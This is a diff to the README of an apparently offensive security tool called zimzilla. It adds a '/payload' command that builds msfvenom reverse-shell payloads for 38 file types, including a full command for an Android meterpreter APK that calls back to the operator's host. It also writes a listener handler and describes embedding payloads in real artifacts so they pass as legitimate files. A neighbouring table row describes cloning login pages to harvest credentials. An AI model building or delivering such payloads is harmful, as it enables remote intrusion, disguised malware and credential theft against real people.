@@ -1401,6 +1401,9 @@ startup and then ignored. Rename it to `allow.yaml` or `out-of-scope.yaml`.
 | `/shodan-vuln-search <query>` | hosts Shodan has flagged with a known CVE |
 | `/shodan-search <query>` | run any Shodan query verbatim — then analyse |
 | `/phish <host>` | clone a login page, serve it, harvest creds into zim-pane |
+| `/payload <ext>` | analyse an extension, build a payload, print the listener |
+| `/payload <ext> --dry-run` | print the exact msfvenom command, build nothing |
+| `/payload <ext> --handler` | the msfconsole listener only |
 | `/zim-logfare` | switch upstream to Logfare (`:4001`) — bundled proxy, all chat models |
 | `/zim-tokenjuice` | switch upstream to Token Juice — direct, no proxy |
 | `/tokenjuice-api-setup [key\|clear]` | your own `tj_` key, or `clear` to fall back to the shared one |
@@ -2396,6 +2399,107 @@ and the JSONL logs after the pane is gone.
 
 ---
 
+## Payload
+
+`/payload <ext>` takes a file extension, says what that extension *is* and what
+will run it, builds a payload for it with `msfvenom`, and prints the listener
+that catches it. It is not a model turn: the extension is looked up in a table,
+the argv is built from that row, and the build runs as a subprocess. The answer
+is the same every time, which is what you want from a command whose output is a
+binary you are about to deliver.
+
+```
+/payload apk
+
+  ◈ EXTENSION .apk  Android package
+  ◈ RUNS ON   Android 4.0+ (dalvik), installed by the user or a sideload
+  ◈ FORMAT    (implied by the payload — `-f apk` is an error)
+  ◈ PAYLOAD   android/meterpreter/reverse_tcp
+  ◈ CALLBACK  192.168.1.102:4444  (this host's outbound address)
+  ◈ ALSO      android/meterpreter/reverse_https, android/meterpreter_reverse_tcp, …
+
+  NOTES
+  · no `-f` — the payload emits the APK; `-f apk` is an error
+  · the build is signed with a debug key, so it installs but is obviously self-signed
+  · `-x <template.apk>` needs apktool >= 2.9.2; older versions refuse
+
+  COMMAND
+  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=4444 -o payload.apk
+
+  ◈ BUILT     ~/.zimzilla/payload/apk-20261025-050142/payload.apk
+  ◈ SIZE      11.5 KiB   in 3.8s
+  ◈ HANDLER   ~/.zimzilla/payload/apk-20261025-050142/handler.rc
+
+  catch it with  msfconsole -r ~/.zimzilla/payload/apk-20261025-050142/handler.rc
+```
+
+**The analysis comes before the build.** An operator who typed the wrong
+extension sees it in the label and the "runs on" line, rather than after a build
+they did not want. `--dry-run` stops there entirely and prints the argv — the
+same function the real run uses, so the two cannot drift.
+
+**Every pairing in the table was measured against a real msfvenom**, and that is
+the point of the table rather than a boast about it. msfvenom's failure modes
+are quiet and several of the obvious pairings do not work:
+
+| Trap | What actually happens |
+|---|---|
+| `-f apk` | `Error: invalid format: apk` — the *payload* emits the APK; passing `-f` at all is the bug |
+| `-f elf-so` with a stageless meterpreter | `Error: selected payload can only generate ELF files` |
+| `-f raw` with a stageless meterpreter | the same refusal |
+| `-f hta-psh` with a meterpreter payload | the generated PowerShell exceeds the 8192-char command line and msfvenom refuses |
+| `-f js_be` with an x64 payload | big-endian format, little-endian payload — refused |
+| `-f java` with a `java/*` payload | `java is not a valid format for Java payloads` |
+| `-f axis2` with a jsp payload | `java/jsp_shell_reverse_tcp is not a Java payload` |
+| `-f osx-app` with a stageless meterpreter | `can only generate MACHO files` |
+
+Each of those is pinned by a test, because they are exactly the kind of thing a
+later cleanup would reintroduce. The suite also builds **every spec and every
+alternative it offers** against the real tool when `ZIMZILLA_PAYLOAD_BUILD=1` is
+set — 38 specs and 37 alternatives, all verified to build.
+
+**38 extensions, grouped by target.** Android (`apk`); Windows (`exe`, `dll`,
+`msi`, `ps1`, `hta`, `vbs`, `vba`, `bat`); Linux and Unix (`elf`, `so`, `sh`,
+`pl`, `py`, `rb`, `js`, `lua`); macOS (`macho`, `dylib`, `app`); Java (`jar`,
+`war`, `jsp`, `axis2`); web (`aspx`, `asp`, `php`); and source or shellcode
+(`c`, `cs`, `go`, `nim`, `rs`, `zig`, `asm`, `bin`, `b64`, `hex`, `txt`).
+`/payload` with no argument lists them all with what runs each one.
+
+**Names work as well as extensions.** `/payload android`, `/payload windows`,
+`/payload bash`, `/payload python`, `/payload shellcode` and about twenty more
+resolve to the right row, and so does a filename — `/payload app.apk` is the
+same run as `/payload apk`, because that is what an operator types when they are
+looking at the file they want to imitate.
+
+**The callback defaults to this host's outbound address**, read from the routing
+table with a UDP socket that is never sent on. `--lhost` and `--lport` override
+it. A loopback default is the honest answer when there is no route — a payload
+pointing at `127.0.0.1` is obviously wrong, which beats a plausible-looking
+address that is also wrong.
+
+**Template injection is checked, not assumed.** `--template FILE` embeds the
+payload in an existing artifact, which is the difference between a payload and a
+payload that looks like the thing it is pretending to be. It works for PE
+(`-x app.exe -k`) and it does **not** work for APK on a host whose apktool is
+older than 2.9.2 — msfvenom says so plainly, and this checks the version before
+offering it rather than letting the build fail after a minute of work. Debian
+ships 2.7.0, so this is the common case, not an edge one.
+
+**The handler is written, not just printed.** `handler.rc` lands beside the
+payload with `ExitOnSession false` and `exploit -j`, so a second target does not
+need a second console. `msfconsole -r <that file>` is the whole catch.
+
+**Where it lands.** `<state_dir>/payload/<ext>-<timestamp>/` — beside the osint
+cases, the hunt campaigns and the crack runs. A payload in a git checkout is a
+payload that gets committed, which is why it does not go in the working
+directory.
+
+> **Authorised use only.** `/payload` builds a payload for a target you own or
+> are authorised to test. The command cannot verify that — it builds what you
+> ask for, and the rest is yours.
+
+---
+
 ## Layout
 
 ```
@@ -2420,6 +2524,7 @@ zimzilla/                     the package
   hunt.py                     the campaign engine — wave loop, per-wave dirs, reports
   ad.py                       /ad — the AD doctrine: gate, tool probe, interlock
   crack.py                    /crack — hash identification, the bounded ladder, the estimate
+  payload.py                  /payload — the extension table, the argv, the build, the handler
   opencode.py                 /zim-opencode — the proxy pool, rotation, and the launch
   update.py                   launch-time check for new commits
   theme.py                    green / amber / cyan / system palettes, and the
@@ -2465,6 +2570,7 @@ python tests/test_tokenjuice_key.py  # /tokenjuice-api-setup — your key, and t
 python tests/test_boot.py          # the boot screen — the logo spin, frame geometry
 python tests/test_opencode.py      # /zim-opencode — the pool, rotation, retry policy, alias
 python tests/test_shodan.py        # /shodan-* — the key, the query, the result, the turn
+python tests/test_payload.py       # /payload — the table, the argv, the traps, the wiring
 ```
 
 `test_agent_limits.py` stubs `_stream_once` and drives `run_turn` directly, so
